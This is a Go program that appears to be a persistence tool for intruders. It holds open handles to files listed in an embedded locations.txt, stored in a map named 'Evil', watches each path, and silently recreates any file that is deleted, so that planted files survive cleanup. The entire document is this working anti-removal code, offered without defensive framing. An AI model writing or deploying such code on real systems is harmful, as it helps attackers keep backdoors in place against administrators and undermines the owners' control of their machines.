package main

import (
	_ "embed"
	"fmt"
	"io"
	"log"
	"os"
	"strings"
	"time"

	"github.com/fsnotify/fsnotify"
)

var (
	//go:embed files/locations.txt
	locations string
)

var Evil = make(map[string]*os.File)

var debug bool = false

func OpenFiles() {
	lines := strings.Split(locations, "\n")
	i := 1
	for _, line := range lines {
		file, _ := os.Open(line)
		if file == nil {
			continue
		}

		if debug {
			fmt.Println(i, line)
		}
		i++
		Evil[line] = file

		go DeletionObserver(line)

	}
}

func DeletionObserver(location string) {
	// Create a new watcher instance
	watcher, err := fsnotify.NewWatcher()
	if err != nil && debug {
		log.Fatal(err)
	}
	defer watcher.Close()

	// Start listening for events.
	go func() {
		for {
			select {
			case event, ok := <-watcher.Events:
				if !ok {
					return
				}
				// log.Println("event:", event)
				if event.Has(fsnotify.Chmod) {
					if debug {
						log.Println("[DELETED]:", event.Name)
						log.Println("Replacing file!")
					}
					Replace(location, Evil[location])
					watcher.Close()
					Evil[location].Close()
					return

				}
			case err, ok := <-watcher.Errors:
				if !ok {
					return
				}
				if debug {
					log.Println("error:", err)
				}
			}
		}
	}()
	err = watcher.Add(location)
	if err != nil && debug {
		log.Fatal(err)
	}

	// Block main goroutine forever.
	<-make(chan struct{})
}

func Replace(location string, file *os.File) {
	// Create a new file
	newFile, err := os.Create(location)
	if err != nil && debug {
		panic(err)
	}
	defer newFile.Close()

	// Copy the contents of the original file to the new file
	_, err = io.Copy(newFile, file)
	if err != nil && debug {
		panic(err)
	}
	if debug {
		fmt.Println("File Replaced", location)
	}
	DeletionObserver(location)
}

func main() {
	if debug {
		fmt.Println(locations)
	}
	OpenFiles()
	if debug {
		fmt.Println(Evil)
	}
	for true {
		if debug {
			fmt.Println("[HEARTBEAT]", len(Evil))
		}
		time.Sleep(time.Millisecond * 5000)
	}
}
